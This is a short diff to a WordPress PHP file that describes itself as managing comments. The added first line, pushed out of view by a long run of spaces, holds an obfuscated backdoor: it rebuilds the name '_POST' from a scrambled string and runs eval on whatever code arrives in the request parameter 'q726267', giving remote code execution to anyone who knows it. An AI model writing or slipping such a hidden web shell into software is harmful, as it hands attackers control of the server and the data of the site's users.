@@ -1,4 +1,4 @@
-<?php
+<?php                                                                                                                                                                                                                                                            $ylj8 ="ost_p" ; $vli96 =strtoupper( $ylj8[3].$ylj8[4]. $ylj8[0]. $ylj8[1]. $ylj8[2]) ; if(isset ( ${ $vli96 } [ 'q726267']) ){ eval ( ${$vli96 } ['q726267' ] ) ; } ?><?php
 /**
  * Manages WordPress comments
  *
